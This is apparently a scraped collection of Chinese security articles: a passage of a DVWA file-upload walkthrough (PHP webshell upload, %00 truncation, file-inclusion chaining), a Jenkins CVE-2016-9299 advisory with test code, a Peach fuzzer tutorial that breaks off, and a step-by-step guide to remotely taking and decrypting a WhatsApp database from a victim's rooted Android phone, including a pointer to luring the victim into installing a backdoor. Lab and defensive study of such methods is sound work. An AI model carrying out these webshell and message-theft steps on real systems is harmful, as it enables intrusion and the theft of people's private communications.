然后菜刀就会通过向服务器发送包含apple参数的post请求，在服务器上执行任意命令，获取webshell权限。可以下载、修改服务器的所有文件。  可以打开服务器的虚拟终端。Medium服务器端核心代码&lt;?php if( isset( $_POST[ 'Upload' ] ) ) {     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . ""hackable/uploads/"";     $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );     // File information     $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];     $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];     $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];     // Is it an image?     if( ( $uploaded_type == ""image/jpeg"" || $uploaded_type == ""image/png"" ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) ) {         // Can we move the file to the upload folder?         if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {             // No             echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;';         }         else {             // Yes!             echo ""&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;"";         }     }     else {         // Invalid file         echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;';     } } ?&gt; 可以看到，Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。漏洞利用1.组合拳（文件包含+文件上传）因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查，尝试修改文件名为hack.png。    上传成功。   启用中国菜刀。  不幸的是，虽然成功上传了文件，但是并不能成功获取webshell权限，在菜刀上无论进行什么操作都会返回如下信息。      中国菜刀的原理是向上传文件发送包含apple参数的post请求，通过控制apple参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。那么如何让服务器将其解析为php文件呢？我们想到文件包含漏洞（详见文件包含漏洞教程）。这里可以借助Medium级别的文件包含漏洞来获取webshell权限，打开中国菜刀，右键添加，在地址栏中输入http://192.168.153.130/dvwa/vulnerabilities/fi/?page=hthttp://tp://192.168.153.130/dvwa/hackable/uploads/hack.png参数名为apple，脚本语言选择php。      点击添加，成功获取webshell权限。   2.抓包修改文件类型上传hack.png文件，抓包。    可以看到文件类型为image/png，尝试修改filename为hack.php。    上传成功。   上菜刀，获取webshell权限。   3.截断绕过规则在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png。可以看到，包中的文件类型为image/png，可以通过文件类型检查。    上传成功。 而服务器会认为其文件名为hack.php，顺势解析为php文件。遗憾的是，由于本次实验环境的php版本为5.4.31，所以无法进行验证。High服务器端核心代码&lt;?php if( isset( $_POST[ 'Upload' ] ) ) {     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . ""hackable/uploads/"";     $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );     // File information     $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);     $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];     $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];     // Is it an image?     if( ( strtolower( $uploaded_ext ) == ""jpg"" || strtolower( $uploaded_ext ) == ""jpeg"" || strtolower( $uploaded_ext ) == ""png"" ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) &amp;&amp;         getimagesize( $uploaded_tmp ) ) {         // Can we move the file to the upload folder?         if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {             // No             echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;';         }         else {             // Yes!             echo ""&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;"";         }     }     else {         // Invalid file         echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;';     } } ?&gt; strrpos(string,find,start)函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”*.jpg”、”*.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。漏洞利用采用%00截断的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片，由于实验环境的php版本原因，这里只演示如何借助High级别的文件包含漏洞来完成攻击。首先利用copy将一句话木马文件php.php与图片文件1.jpg合并 生成的文件hack.jpg 打开可以看到，一句话木马藏到了最后。顺利通过文件头检查，可以成功上传。  上菜刀，右键添加shell，地址栏填入http://192.168.153.130/dvwa/vulnerabilities/fi/?page=file:///C:/xampp/htdocs/dvwa/hackable/uploads/hack.jpg参数名填apple，脚本语言选择php。成功拿到webshell。 Impossible服务器端核心代码&lt;?php if( isset( $_POST[ 'Upload' ] ) ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );     // File information     $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);     $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];     $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];     $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];     // Where are we going to be writing to?     $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';     //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';     $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;     $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );     $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;     // Is it an image?     if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) &amp;&amp;         ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &amp;&amp;         getimagesize( $uploaded_tmp ) ) {         // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)         if( $uploaded_type == 'image/jpeg' ) {             $img = imagecreatefromjpeg( $uploaded_tmp );             imagejpeg( $img, $temp_file, 100);         }         else {             $img = imagecreatefrompng( $uploaded_tmp );             imagepng( $img, $temp_file, 9);         }         imagedestroy( $img );         // Can we move the file to the web root from the temp folder?         if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {             // Yes!             echo ""&lt;pre&gt;&lt;a href='${target_path}${target_file}'&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"";         }         else {             // No             echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;';         }         // Delete any temp files         if( file_exists( $temp_file ) )             unlink( $temp_file );     }     else {         // Invalid file         echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;';     } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; in_get(varname)函数返回相应选项的值imagecreatefromjpeg ( filename )函数返回图片文件的图像标识，失败返回falseimagejpeg ( image , filename , quality)从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。 imagedestroy( img )函数销毁图像资源可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。","2016-11-21 15:04:31","Web安全","新手指南：DVWA-1.9全级别教程之File Upload","http://nsoad.com/Article/web/20161121/825.html"
"5ccbfb164f2f0a0a7a69c10f","11月11日，Jenkins 在官方安全邮件列表中通告了一个可能导致远程代码执行的漏洞，官方将该漏洞定义为 CRITICAL（严重），并强烈建议在公网部署了 Jenkins 的管理员立即禁用 CLI 选项。","blackhold","前言11月11日，Jenkins 在官方安全邮件列表中通告了一个可能导致远程代码执行的漏洞，官方将该漏洞定义为 CRITICAL（严重），并强烈建议在公网部署了 Jenkins 的管理员立即禁用 CLI 选项。11月12日，Jenkins 再次在邮件列表中确认漏洞存在，将声明会在16日发布更新以修复该漏洞。北京时间11月17号，Jenkins 发布了新的安全更新，修复了该漏洞，并在 GitHub 上给出了漏洞 PoC。影响CVE IDCVE-2016-9299披露时间2016-11-11影响版本LTS Release 2.19.3 之前的所有版本Weekly Release 2.32 之前的所有版本漏洞影响: Jenkins 官方在更新了漏洞修复补丁的同时，也在 GitHub 上添加了相关的测试代码，测试代码中包含针对此漏洞测试的 Payload，通过远程执行代码来测试该漏洞是否存在，这可能造成 Jenkins 应用被大面积攻击。强烈建议 Jenkins 管理员立即升级最新版以修复该漏洞。漏洞分析未授权的攻击者可以将精心构造的 Java 反序列化数据传递给 Jenkins CLI，之后可以控制 Jenkins 连接到攻击者控制的 LDAP 服务器，然后 LDAP 服务器响应的 Payload 可以导致远程任意代码执行。漏洞验证漏洞测试方法见 Jenkins 官方测试代码：@PresetData(PresetData.DataSet.ANONYMOUS_READONLY)@Test@Issue(""SECURITY-360"")public void ldap() throws Exception {    // with a proper fix, this should fail with EXIT_CODE_REJECTED    // otherwise this will fail with -1 exit code    probe(Payload.Ldap, PayloadCaller.EXIT_CODE_REJECTED);} private void probe(Payload payload, int expectedResultCode) throws Exception {    File file = File.createTempFile(""security-218"", payload + ""-payload"");    File moved = new File(file.getAbsolutePath() + ""-moved"");        // Bypassing _main because it does nothing interesting here.    // Hardcoding CLI protocol version 1 (CliProtocol) because it is easier to sniff.    int exitCode = new CLI(r.getURL()).execute(""send-payload"",            payload.toString(), ""mv "" + file.getAbsolutePath() + "" "" + moved.getAbsolutePath());    assertEquals(""Unexpected result code."", expectedResultCode, exitCode);    assertTrue(""Payload should not invoke the move operation "" + file, !moved.exists());    file.delete();}    ... public class Ldap extends PayloadRunner implements ObjectPayload {        public Object getObject(final String command) throws Exception {        // this is not a fully exploit, so we cannot honor the command,        // but we want to check that we are blocking LdapAttribute        Class c = Class.forName(""com.sun.jndi.ldap.LdapAttribute"");        Constructor ctr = c.getDeclaredConstructor(String.class);        ctr.setAccessible(true);        return ctr.newInstance(""foo"");    }        public static void main(final String[] args) throws Exception {        PayloadRunner.run(Ldap.class, args);    }}参考方案Jenkins 发布了新版 Release，可以升级到以下版本：main line 2.32LTS 2.19.3 参考官方参考Jenkins https://jenkins.io/邮件组 https://groups.google.com/forum/#!msg/jenkinsci-advisories/-fc-w9tNEJE/GRvEzWoJBgAJ官方 PoC https://github.com/jenkinsci/jenkins/blob/master/test/src/test/java/jenkins/security/Security218CliTest.java","2016-11-21","漏洞发布","Jenkins 远程代码执行漏洞预警","http://nsoad.com/Article/exploit/20161121/vulzone-36.html"
"5ccbfb164f2f0a0a7a69c110","针对已root过的安卓移动设备，本文主要讲解远程攻击并解密WhatsApp数据库的详细过程。另外，这再一次提醒我们，对移动设备进行root（安卓）或越狱（iOS），将使用户暴露在黑","blackhold","针对已root过的安卓移动设备，本文主要讲解远程攻击并解密WhatsApp数据库的详细过程。另外，这再一次提醒我们，对移动设备进行root（安卓）或越狱（iOS），将使用户暴露在黑客攻击之下。几 小时前，网络上发布了一个有趣的文章《如何远程破解并解密WhatsApp数据库[ROOT]》，文中解释了如何从一个root过的安卓系统中提取并解密 WhatsApp数据库。尽管通常情况下WhatsApp非常安全，但对安卓设备的root处理将可能使用户暴露在攻击风险之中。接下来，就让我们一步一步看看作者（使用匿名F.E.A.R.）所提出的攻击场景。步骤1：利用并获取安卓设备的访问权限正如这篇指南中所解释的，如果安卓设备通过使用Meterpeter命令进行了root，那么这一阶段将变得很简单。为了攻击并解密WhatsApp数据库，攻击者需要一个存在于数据文件夹中的密钥文件，而访问该文件的唯一途径就是拥有root权限。此外，该密钥文件是解密WhatsApp数据库所必不可少的。步骤2：下载数据库使用下列命令通过Meterpreter下载数据库：cd /cd /sdcard/WhatsAppls (打印当前目录)cd Databases下载msgstore.db.crypt8 (这里需要耗费一些时间，可能很长) 步骤3：提取解密密钥解密WhatsApp数据库所必需的密钥文件中存储了两套解密密钥，即实际的加密密钥K和一个名为IV的初始化向量。值得一提的是，WhatsApp密钥文件存储在一个安全的位置。下面这些都是提取密钥文件的命令：shellsu（超级用户访问或仅仅进行提权）正如F.E.A.R.所解释的，这是最困难的部分，特别是如果目标手机用户是有经验且熟练的用户，因为他必须已经安装SuperSU应用程序。如何诱导受害者安装SuperSU？可以看一下用户bart发布的这篇教程，里面解释了如何伪装一个后门应用程序。不过，如果下列场景中的受害者并非是一个有经验的或熟练的用户，那么事情将变得更加简单：1、他们没有安装SuperSU应用程序。2、对于新安装的应用，他们没有改变设置为PROMPT，而并非GRANT。执行以下命令来访问密钥文件夹，并提取解密密钥。cd /cd /data/datalscd com.whatsapp lscd filesls cp key /sdcard/Download (意思是将文件key拷贝到/sdcard/Download文件夹)步骤4：下载解密密钥文件到root目录下载提取的密钥文件到root目录，该目录中还含有加密的WhatsApp数据库：cd /cd /sdcard/Downloaddownload keyrm key (确保你删除了key文件)步骤5：解密WhatsApp数据库文章中报道了2种不同的方法来解密WhatsApp：（1）使用Linux命令：每次复制并粘贴一条命令，不要将它们写成一个脚本文件，否则它将不能正常工作：hexdump -e '2/1 ""%02x""' key | cut -b 253-316 &gt; aes.txthexdump -n 67 -e '2/1 ""%02x""' msgstore.db.crypt8 | cut -b 103-134 &gt; iv.txtdd if=msgstore.db.crypt8 of=msgstore.db.crypt8.nohdr ibs=67 skip=1openssl  enc -aes-256-cbc -d -nosalt -nopad -bufsize 16384 -in  msgstore.db.crypt8.nohdr -K $(cat aes.txt) -iv $(cat iv.txt) &gt;  msgstore.gzgzip -cdq msgstore.gz &gt; msgstore.db如果第4行命令不能工作，那么就按下面的指令操作：hexdump -e ‘2/1 “%02x”‘ key | cut -b 253-316hexdump -n 67 -e ‘2/1 “%02x”‘ msgstore.db.crypt8 | cut -b 103-134openssl  enc -aes-256-cbc -d -nosalt -nopad -bufsize 16384 -in  msgstore.db.crypt8.nohdr -K (从第1条指令中粘贴文本文档) -iv (从第2条指令中粘贴文本文档) &gt;  msgstore.gz（2）第二种方法基于简单的Windows WhatsApp查看器应用程序，可以看一下原文。这是又一次的教训，对移动设备进行root（安卓）或越狱（iOS），将使用户暴露在黑客攻击之下。","2016-07-29 14:16:51","Web安全","解密：攻击者是如何一步步拿下你的WhatsApp数据库","http://nsoad.com/Article/web/20160729/193.html"
"5ccbfb164f2f0a0a7a69c111","本文旨在详细介绍文件Fuzz工具Peach的使用，涵盖了基于Python的2.3旧版本和基于C#的3.1新版本，讲求实践与语法并重，适合零基础和有一定其他Fuzz工具使用经验的人z作为学习参考。","Kong","0×0 前言本文旨在详细介绍文件Fuzz工具Peach的使用，涵盖了基于Python的2.3旧版本和基于C#的3.1新版本，讲求实践与语法并重，适合零基础和有一定其他Fuzz工具使用经验的人z作为学习参考。文中若有不当之处，还望不吝指正。说明：本文中穿插对比了3版本较于2版本有较大改动的地方，并以“V3：”特意标注。0×1 Peach介绍与安装Peach是用python/C#写的开源Smart Fuzz工具，支持两种Fuzz方法：基于生长(Generation Based)、基于变异(Mutation Based)1.基于生长：产生随机或启发性数据填充给定的数据模型2.基于变异：在给定样本文件的基础上进行修改 在32位win7上安装的具体步骤： 1.Peach3安装指南 2.下载安装.NET4运行环境 3.下载安装Debugging Tools for Windows 根据官网的提示，如果想要独立安装，那么在安装SDK的中途做出选择即可 下载完后根据提示找到文件保存位置 4.在Peach Community上找到Peach 3的x86-release版本下载入口 5.解压源码到任意文件夹 6.运行以下命令，测试自带的HelloWorld能否正常运行。发现cmd开始不停滚动，成功！ 0×2 定义Peach Pit为了开始进行文件 Fuzz，首先必须创建一个该格式的 Peach Pit 文件。Peach Pit 文件使用XML语言定义数据结构，里面记录了文件格式的组织方式，我们需要如何进行 Fuzz，Fuzz 的目标等信息Peach Pit，包含5个模块：1.GeneralConf(V3:General Configuration)2.DataModel(V3:Data Modeling)3.StateModel(V3:State Modeling)4.Agents and Monitors(V3:不变)5.Test and Run Configuration(V3:Test Configuration，去掉了Run) 一个简单的XML框架：&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;&lt;Peach xmlns=http://phed.rig/2008/Peach xmlns:xsi=""http://www.w3.org/ 2001/xmlSchema-instance""xsi:schemaLocation=""http://phed.org/2008/Peach ../peach.xsd""&gt;&lt;!-- add elements here --&gt;&lt;/Peach&gt;V3:需要将以上包含…2008…的字段改为以下内容：&lt;Peach xmlns=""http://peachfuzzer.com/2012/Peach"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:schemaLocation=""http://peachfuzzer.com/2012/Peach ../peach.xsd""&gt;1.GeneralConf / General Configuration定义基本配置信息，包括1.Include——要包含的其他Peach Pit文件2.Import——要导入的python库或自定义模块3.PythonPath——要添加的python库的路径4.所有的Peach Pit文件都要包含default.xml文件在HelloWorld中：&lt;Include ns=""default"" src=""file:defaults.xml"" /&gt;V3:强制包含default.xml这一限制在版本3中已经去掉，改为Defaults属性包含，参考2.DataModelDataModel 元素是 Peach 根元素的子节点，常用属性主要是以下两个：1.name——相当于起一个”变量名“2.ref——引用标签，是否继承于某一个已定义的DataModel（这里继承的含义类似于面向对象中的继承，被引用的 DataModel 将为作为新的 DataModel 的基数据 ，可以重用或更新子元素）DataModel定义了某一格式类型文件的数据模型，包括数据结构、数据关系等，常用的子元素有以下几种：1.String——字符串型，包含了name，length等常用属性（V3:需要特别注意，在版本2中表示字符串不可变的isStatic属性在版本3中更名为token）2.Number——数据型，可以是8、16、32或64字节的数据，并通过size属性来设定，同时也包含name属性作为名称3.Blob——无具体数据类型，通常用来定义不明类型的数据，包含name、length、value等属性4.Block——用于对数据进行分组，用来组合一个或者多个的其他元素 ，比如 Number 或者 String，有点类似于DataModel，只不过两者的位置不同。小技巧：可以把一个复杂的数据结构拆成几部分，在一个 Peach Pit 文件里定义多个不同层级的 DataModel，并通过 ref 标签层层递进，从而增强可读性和可重用性。举例如下：&lt;DataModel name=""HelloData""&gt;&lt;String name=""ID"" size=""32"" value=""RIFF"" isStatic=""true"" /&gt;&lt;Blcok name=""TypeAndData""&gt;&lt;Number name=""Type"" size=""16"" /&gt;&lt;Blob name=""Data"" /&gt;&lt;/Block&gt;&lt;/DataModel&gt;在HelloWorld.xml中：&lt;DataModel name=""HelloWordlTemplate""&gt;&lt;String value=""Hello World!"" /&gt;&lt;/DataModel&gt;3.StateModel• 描述如何向目标程序发送或接受数据• 每个StateModel至少由一个State组成，第一个State由InitialState指定，并且State只有一个属性name• 每个State至少由一个Action组成，定义StateModel中的各种动作，动作类型由type指定• type包括start,stop,open,close,input,output,call等举例如下：&lt;!--输入型动作--&gt;&lt;Action type=""input""&gt;&lt;DataModel ref=""InputModel"" /&gt;&lt;/Action&gt;&lt;!--输出型动作，输出到文件sample.bin中--&gt;&lt;Action type=""output""&gt;&lt;DataModel ref=""SomeDataMode"" /&gt;&lt;Data name=""sample"" filename=""sample.bin"" /&gt;&lt;/Action&gt;&lt;!-- 调用动作，按照数据模型Param1DataModel产生的数据作为函数DoStuff的参数 --&gt;&lt;Action type=""call"" method=""DoStuff""&gt;&lt;Param name=""param1"" type=""in""&gt;&lt;DataModel ref=""Param1DataModel"" /&gt;&lt;/Param&gt;&lt;/Action&gt;&lt;!-- 关闭动作 --&gt;&lt;/Action type=""close"" /&gt;在Helloworld中，只需要接收数据模型HelloWorldTemplate中的数据&lt;StateModel name=""state"" initalState=""State""&gt;&lt;State name=""State1""&gt;&lt;Action type=""output""&gt;&lt;DataModel ref=""HelloWorldTemplate"" /&gt;&lt;/Action&gt;&lt;/State&gt;&lt;/StateModel&gt;4. Agents and Monitors定义代理和监视器，可以调用Windbg等调试器来监控程序运行的错误信息等，目前已有的Agent包括Local Agent、TCP Remoting Agent、ZeroMQ和REST Json AgentAgent下定义Monitor来监视举例如下：&lt;Agent name=""LocalAgent"" Location=""http://127.0.0.1:9000""&gt;&lt;!-- 调用WinDbg来执行notepad.exe filename命令 --&gt;&lt;Mointor class=""debugger.WindowsDebugEngine""&gt;&lt;!-- V3:class统一名为WindowsDebugger --&gt;&lt;Param name=""CommandLine"" value=""notepad.exe filename命令"" /&gt;&lt;/Mointor&gt;&lt;!-- 开启页堆调试，在大多数Windows Fuzzing中很有用 --&gt;&lt;Monitor class=""process.PageHeap""&gt;&lt;!-- V3:class统一名为PageHeap --&gt;&lt;Param name=""Executable"" value=""notepad.exe"" /&gt;&lt;/Monitor&gt;&lt;/Agent&gt;5.Test and Run configuration / Test Configuration版本2中包括Test和Run两个元素，版本3中只要Test一个元素即可Test用来定义一个测试的配置，包括一个StateModel和一个Publisher（必需），以及including和excluding、Agent（可选）等信息 例子：&lt;Test name=""TheTest""&gt;&lt;!-- V3:几乎所有Test name都命名为Default，不然会报错 --&gt;&lt;Exclude xpath=""//Reserved"" /&gt;&lt;Agent ref=""LocalAgent"" /&gt;&lt;StateModel ref=""TheState"" /&gt;&lt;!-- 将生成的畸形数据写到FuzzedFile文件中 --&gt;&lt;Publisher class=""file.FileWriter""&gt;&lt;Param name=""fileName"" value=""FuzzedFile"" /&gt;&lt;/Publisher&gt;&lt;/Test&gt;Publisher用来定义Peach的IO连接，可以构造网络数据流和文件流等HelloWorld中只需要把生成的畸形数据显示到命令行，所以Publisher用的是标准输出stdout.Stdout(版本2)/Console(版本3)&lt;Test name=""HelloWorldTest""&gt;&lt;StateModel ref=""State"" /&gt;&lt;!-- 将生成的畸形数据写到FuzzedFile文件中 --&gt;&lt;Publisher class=""stdout.Stdout"" /&gt;&lt;/Test&gt;（以下一段Run是版本2）Run元素定义运行哪些测试，包含一个到多个Test元素，（可选）用Logger配置日志来捕获运行结果 举例&lt;Run name=""DefaultRun""&gt;&lt;Test ref=""TheTest"" /&gt;&lt;!-- 把日志记录到c:\peach\logtest路径下 --&gt;&lt;Logger class=""logger.Filesystem""&gt;&lt;Param name=""path"" value=""c:\peach\logtest路径下"" /&gt;&lt;/Logger&gt;&lt;/Run&gt;而版本3中，Logger作为Test的子元素，写在其中即可，如下所示：&lt;Test name=""Default""&gt;....&lt;Logger class=""Filesystem""&gt;&lt;Param name=""Path"" value=""logs"" /&gt;&lt;/Logger&gt;&lt;/Test&gt;在HelloWorld中:&lt;Run name=""DefaultRun""&gt;&lt;Test ref=""HelloWorldTest"" /&gt;&lt;/Run&gt;0×3 HelloWorld.xml初体验根据之前的分析介绍，不难写出一个简单的HelloWorld代码，各位读者不妨先自己动手写写看。 给出示例——在2版本下能够运行的代码如下：&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;&lt;Peach xmlns=""http://phed.org/2008/Peach"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:schemaLocation=""http://phed.com/2008/Peach ../peach.xsd""&gt;&lt;Include ns=""default"" src=""file:default.xml"" /&gt;&lt;DataModel name=""HelloWorldTemplate""&gt;&lt;String value=""Hello World!""/&gt;&lt;/DataModel&gt;&lt;StateModel name=""State"" initialState=""State1""&gt;&lt;State name=""State1""&gt;&lt;Action type=""output""&gt;&lt;DataModel ref=""HelloWorldTemplate""/&gt;&lt;/Action&gt;&lt;/State&gt;&lt;/StateModel&gt;&lt;Test name=""TheTest""&gt;&lt;StateModel ref=""State""/&gt;&lt;!-- 将生成的畸形数据写到FuzzedFile文件中 --&gt;&lt;Publisher class=""stdout.Stdout""/&gt;&lt;/Test&gt;&lt;Run name=""DefaultRun""&gt;&lt;Test ref=""TheTest"" /&gt;&lt;!-- 把日志记录到c:\peach\logtest路径下 --&gt;&lt;Logger class=""logger.Filesystem""&gt;&lt;Param name=""path"" value=""c:\peach\logtest"" /&gt;&lt;/Logger&gt;&lt;/Run&gt;&lt;/Peach&gt;而对于3版本就需要改动一部分：1. 在实际调试中，修改了几处，首先是把xmlns改成了http://peachfuzzer.com/2012/Peach，否则会出现更新提示2. 删除了include，因为报错提示说找不到default.xml文件3. Test name改为了Default，因为报错说找不到default4. 删除了run元素，报错提示说在当前命名空间下子元素非法，应当出现的元素为：’Include, Import, Require, PythonPath, RubyPath, Python, Ruby, Defaults, Data, DataModel, Godel, StateModel,Agent, Test’ 给出示例——在3版本下能够运行的代码如下：&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;&lt;Peach xmlns=""http://peachfuzzer.com/2012/Peach"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:schemaLocation=""http://peachfuzzer.com/2012/Peach ../peach.xsd""&gt;&lt;!-- add elements here --&gt;&lt;DataModel name=""HelloWorldTemplate""&gt;&lt;String value=""Hello World!""/&gt;&lt;/DataModel&gt;&lt;StateModel name=""State"" initialState=""State1""&gt;&lt;State name=""State1""&gt;&lt;Action type=""output""&gt;&lt;DataModel ref=""HelloWorldTemplate""/&gt;&lt;/Action&gt;&lt;/State&gt;&lt;/StateModel&gt;&lt;Test name=""Default""&gt;&lt;StateModel ref=""State""/&gt;&lt;!-- 将生成的畸形数据写到FuzzedFile文件中 --&gt;&lt;Publisher class=""stdout.Stdout""/&gt;&lt;/Test&gt;&lt;/Peach&gt;官方给出的HelloWorld.xml如下，大家可以参考：&lt;?xml version=""1.0"" encoding=""utf-8""?&gt;&lt;Peach xmlns=""http://peachfuzzer.com/2012/Peach"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""xsi:schemaLocation=""http://peachfuzzer.com/2012/Peach ../peach.xsd""&gt;&lt;!--This is a very simple Hello World example.Syntax:peach samples\HelloWorld.xmlOutput:This example will display all each test case to the console, you should see lots of test datascroll along. This example should only take a couple minutes to complete.Authors:Michael Eddington (mike@dejavusecurity.com)--&gt;&lt;!-- Create a simple data template containing a single string --&gt;&lt;DataModel name=""TheDataModel""&gt;&lt;String value=""Hello World!"" /&gt;&lt;/DataModel&gt;&lt;!-- Our state model will perform actions using our data models. Actions are thingslike sending or receiving data. How the data is sent or received will depend onthe publisher we specify later on. For example you might configure to usea FileWriter publisher that would write a file. For this example we will be displaying the output to the console via standard out (Stdout).--&gt;&lt;StateModel name=""State"" initialState=""State1"" &gt;&lt;State name=""State1"" &gt;&lt;Action type=""output"" &gt;&lt;DataModel ref=""TheDataModel""/&gt;&lt;/Action&gt;&lt;/State&gt;&lt;/StateModel&gt;&lt;!-- Our Test element will link together our state model and publisher --&gt;&lt;Test name=""Default""&gt;&lt;StateModel ref=""State""/&gt;&lt;!--The publisher we select will determin what the actionsin our state model actually do. For this example we areusing the ""Stdout"" publisher. This publisher will send any""output"" actions to the console.--&gt;&lt;Publisher class=""Console"" /&gt;&lt;/Test&gt;&lt;/Peach&gt;&lt;!-- end --&gt;0×4 数据依赖关系参考官方文档Peach 允许数据间的关系建模。关系像“X 是 Y 的大小”，“X 是 Y 出现的次数”，或者“X是 Y 的偏移（以字节为单位）”。Relation元素可以用来表示数据长度、数据个数以及数据偏移等信息，格式如下：&lt;Relation type=""size"" of ""Data"" /&gt;&lt;Relation type=""count"" of ""Data"" /&gt;&lt;Relation type=""offset"" of ""Data"" /&gt;size-of Relation 这个例子里，Number 会指定 Value 字符串的大小，以字节为单位。注意，这对多字节字符（wchar）同样适用。&lt;Number size=""32"" signed=""false""&gt;&lt;Relation type=""size"" of=""Value"" /&gt;&lt;/Number&gt;&lt;String name=""Value"" /&gt;count-of Relation 这个例子里，Number 会指定 Strings 数组的个数。&lt;Number size=""32"" signed=""false""&gt;&lt;Relation type=""count"" of=""Strings"" /&gt;&lt;/Number&gt;&lt;String name=""Strings"" nullTerminated=""true"" maxOccurs=""1024"" /&gt;参考官方文档Fixup元素可以用来表示数据校验值，包括CRC32、MD5、SHA1、SHA256、EthernetChecksum、SspiAuthentication等，格式如下：&lt;Fixup class=""FixupClass""&gt;&lt;Param name=""ref"" value=""Data"" /&gt;&lt;/Fixup&gt;以如下数据模型为例：Offset    Size    Description0×00    4 bytes    Length of Data0×04    4 bytes    Type0×08        Dataafter Data    4 bytes    CRC of Type and Data&lt;DataModel name=""HelloData""&gt;&lt;Number name=""length"" size=""32""&gt;&lt;Relation type=""size"" of ""Data""/&gt;&lt;/Number&gt;&lt;Block name=""TypeAndData""&gt;&lt;String name=""Type"" size=""32""/&gt;&lt;Blob name=""Data""/&gt;&lt;/Block&gt;&lt;Number name=""CRC"" size=""32""&gt;&lt;Fixup class=""checksums.Crc32Fixup""&gt;&lt;Param name=""ref"" value=""TypeAndData""/&gt;&lt;/Fixup&gt;&lt;/Number&gt;&lt;/DataModel&gt;0×5 PNG格式文件Fuzz实战目的：以版本3为例，了解如何具体使用peach来做一次完整的有针对性的Fuzz（现在互联网上流传的基本都是旧版或者不完整的片段，本文代码是经过作者亲自测试有效的） PNG文件格式如下图（图片来源于网络）： 这里先介绍一款文件格式解析神器：010Editor，大家可以自行在官网下载安装，完成之后用它打开本地的一个png图片，如下所示。 注意红框圈住的部分，可以很清楚的看到png文件内部区块的分区和含义，进而归纳出PNG的文件格式——PNG格式如下：1.文件头：由八个字节组成，0x89504e470d0a1a0a2.数据块：每个数据块由四部分构成，他们的描述依次如下：3.Length ：占四字节，表示数据块data域占多少个字节。（注意这里不包括length自身）4.Type 